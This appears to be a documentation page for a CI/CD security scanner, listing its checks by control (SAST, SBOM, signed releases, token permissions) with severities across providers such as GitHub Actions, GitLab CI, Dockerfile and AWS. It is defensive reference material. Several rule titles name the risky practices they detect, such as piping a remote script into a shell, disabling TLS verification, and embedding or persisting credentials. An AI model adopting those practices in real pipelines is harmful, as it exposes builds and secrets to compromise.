| [`BB-009`](#detail-bb-009) | pipe: pinned by version rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-014`](#detail-bb-014) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-021`](#detail-bb-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-027`](#detail-bb-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-001`](#detail-bk-001) | Buildkite plugin not pinned to an exact version | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-004`](#detail-bk-004) | Remote script piped into shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-008`](#detail-bk-008) | TLS verification disabled in step command | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BK-014`](#detail-bk-014) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CA-002`](#detail-ca-002) | CodeArtifact repository has a public external connection | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-005`](#detail-cb-005) | Outdated managed build image | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CB-009`](#detail-cb-009) | CodeBuild image not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-001`](#detail-cc-001) | Orb not pinned to exact semver | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-003`](#detail-cc-003) | Docker image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-018`](#detail-cc-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-021`](#detail-cc-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-028`](#detail-cc-028) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-029`](#detail-cc-029) | Machine executor image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-003`](#detail-df-003) | ADD pulls remote URL without integrity verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-004`](#detail-df-004) | RUN executes a remote script via curl-pipe / wget-pipe | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-010`](#detail-df-010) | apt-get dist-upgrade / upgrade pulls unknown package versions | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DR-001`](#detail-dr-001) | Step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-005`](#detail-dr-005) | Plugin step uses a floating image tag | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-006`](#detail-dr-006) | TLS verification disabled in step commands | <span class="pg-sev pg-sev--high">HIGH</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-008`](#detail-dr-008) | Step uses ``pull: never`` (skips registry verification) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`DR-010`](#detail-dr-010) | Step commands run unpinned package installs | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Drone CI](../providers/drone.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-006`](#detail-ecr-006) | ECR pull-through cache rule uses an untrusted upstream | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`GCB-001`](#detail-gcb-001) | Cloud Build step image not pinned by digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-018`](#detail-gha-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-021`](#detail-gha-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-025`](#detail-gha-025) | Reusable workflow not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-029`](#detail-gha-029) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-001`](#detail-gl-001) | Image not pinned to specific version or digest | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-005`](#detail-gl-005) | include: pulls remote / project without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-009`](#detail-gl-009) | Image pinned to version tag rather than sha256 digest | <span class="pg-sev pg-sev--low">LOW</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-018`](#detail-gl-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-021`](#detail-gl-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-027`](#detail-gl-027) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-028`](#detail-gl-028) | services: image not pinned | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-030`](#detail-gl-030) | trigger: include: pulls child pipeline without pinned ref | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`HELM-001`](#detail-helm-001) | Chart.yaml declares legacy apiVersion: v1 | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-002`](#detail-helm-002) | Chart.lock missing per-dependency digests | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-003`](#detail-helm-003) | Chart dependency declared on a non-HTTPS repository | <span class="pg-sev pg-sev--high">HIGH</span> | [Helm](../providers/helm.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`HELM-004`](#detail-helm-004) | Chart dependency version is a range, not an exact pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Helm](../providers/helm.md) |  |
| [`JF-001`](#detail-jf-001) | Shared library not pinned to a tag or commit | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-009`](#detail-jf-009) | Agent docker image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-018`](#detail-jf-018) | Package install from insecure source | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-021`](#detail-jf-021) | Package install without lockfile enforcement | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-031`](#detail-jf-031) | Package install bypasses registry integrity (git / path / tarball source) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-004`](#detail-oci-004) | Image layer references an arbitrary URL (foreign layer) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-007`](#detail-oci-007) | Image manifest uses legacy schemaVersion 1 (no content addressing) | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-008`](#detail-oci-008) | Manifest references digest using unsupported hash algorithm | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`TKN-001`](#detail-tkn-001) | Tekton step image not pinned to a digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-008`](#detail-tkn-008) | Tekton step script pipes remote install or disables TLS | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`TKN-014`](#detail-tkn-014) | Tekton step script runs unpinned package install | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### SAST: Project uses static analysis / vulnerability scanning { #ctrl-sast }

**Evidenced by 14 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-020`](#detail-ado-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-012`](#detail-argo-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-015`](#detail-bb-015) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-020`](#detail-cc-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-019`](#detail-gl-019) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-020`](#detail-jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`TKN-012`](#detail-tkn-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### SBOM: Releases publish a software bill of materials { #ctrl-sbom }

**Evidenced by 15 checks** across 11 providers (Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Dockerfile, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-007`](#detail-ado-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-010`](#detail-argo-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-007`](#detail-bb-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-010`](#detail-bk-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-007`](#detail-cc-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-016`](#detail-df-016) | Image lacks OCI provenance labels | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GHA-007`](#detail-gha-007) | SBOM not produced (no CycloneDX/syft/Trivy-SBOM step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-007`](#detail-gl-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-007`](#detail-jf-007) | SBOM not produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`OCI-001`](#detail-oci-001) | Image manifest is missing OCI provenance annotations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [OCI manifest](../providers/oci.md) |  |
| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`TKN-010`](#detail-tkn-010) | No SBOM generated for build artifacts | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### Signed-Releases: Release artifacts are cryptographically signed { #ctrl-signed-releases }

**Evidenced by 26 checks** across 12 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, OCI manifest, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-006`](#detail-ado-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ARGO-009`](#detail-argo-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-011`](#detail-argo-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-011`](#detail-bk-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CA-001`](#detail-ca-001) | CodeArtifact domain not encrypted with customer KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-006`](#detail-cc-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-024`](#detail-cc-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-002`](#detail-cp-002) | Artifact store not encrypted with customer-managed KMS key | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`ECR-005`](#detail-ecr-005) | Repository encrypted with AES256 rather than KMS CMK | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-009`](#detail-gcb-009) | Artifacts not signed (no cosign / sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-006`](#detail-gha-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-024`](#detail-gha-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-006`](#detail-jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`LMB-001`](#detail-lmb-001) | Lambda function has no code-signing config | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`OCI-002`](#detail-oci-002) | Image is missing a build attestation manifest | <span class="pg-sev pg-sev--high">HIGH</span> | [OCI manifest](../providers/oci.md) |  |
| [`SIGN-001`](#detail-sign-001) | No AWS Signer profile defined for Lambda deploys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-002`](#detail-sign-002) | AWS Signer profile is revoked or inactive | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`TKN-009`](#detail-tkn-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |
| [`TKN-011`](#detail-tkn-011) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Tekton](../providers/tekton.md) |  |

### Token-Permissions: CI tokens are scoped to the minimum required permissions { #ctrl-token-permissions }

**Evidenced by 60 checks** across 13 providers (AWS, Argo Workflows, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-003`](#detail-ado-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-008`](#detail-ado-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-014`](#detail-ado-014) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ARGO-003`](#detail-argo-003) | Argo workflow uses the default ServiceAccount | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Argo Workflows](../providers/argo.md) |  |
| [`ARGO-006`](#detail-argo-006) | Literal secret value in Argo template env or parameter default | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Argo Workflows](../providers/argo.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-003`](#detail-bb-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-008`](#detail-bb-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-011`](#detail-bb-011) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-017`](#detail-bb-017) | Repository token written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-019`](#detail-bb-019) | after-script references secrets | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-002`](#detail-bk-002) | Literal secret value in pipeline env block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Buildkite](../providers/buildkite.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CA-004`](#detail-ca-004) | CodeArtifact repo policy grants codeartifact:* with Resource '*' | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CB-001`](#detail-cb-001) | Secrets in plaintext environment variables | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CB-006`](#detail-cb-006) | CodeBuild source auth uses long-lived token | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CC-005`](#detail-cc-005) | AWS auth uses long-lived access keys in environment block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-008`](#detail-cc-008) | Credential-shaped literal in config body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-019`](#detail-cc-019) | `add_ssh_keys` without fingerprint restriction | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-030`](#detail-cc-030) | Workflow job uses context without branch filter or approval gate | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CCM-003`](#detail-ccm-003) | CodeCommit trigger targets SNS/Lambda in a different account | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CP-004`](#detail-cp-004) | Legacy ThirdParty/GitHub source action (OAuth token) | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GCB-002`](#detail-gcb-002) | Cloud Build uses the default service account | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-003`](#detail-gcb-003) | Secret Manager value referenced in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-007`](#detail-gcb-007) | availableSecrets references ``versions/latest`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-004`](#detail-gha-004) | Workflow has no explicit permissions block | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-008`](#detail-gha-008) | Credential-shaped literal in workflow body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-019`](#detail-gha-019) | GITHUB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-037`](#detail-gha-037) | actions/checkout persists GITHUB_TOKEN into .git/config | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-039`](#detail-gha-039) | services / container credentials embedded as literal in workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-003`](#detail-gl-003) | Variables contain literal secret values | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-008`](#detail-gl-008) | Credential-shaped literal in pipeline body | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-013`](#detail-gl-013) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-020`](#detail-gl-020) | CI_JOB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`IAM-001`](#detail-iam-001) | CI/CD role has AdministratorAccess policy attached | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`IAM-002`](#detail-iam-002) | CI/CD role has wildcard Action in attached policy | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-003`](#detail-iam-003) | CI/CD role has no permission boundary | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`IAM-004`](#detail-iam-004) | CI/CD role can PassRole to any role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`IAM-005`](#detail-iam-005) | CI/CD role trust policy missing sts:ExternalId | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
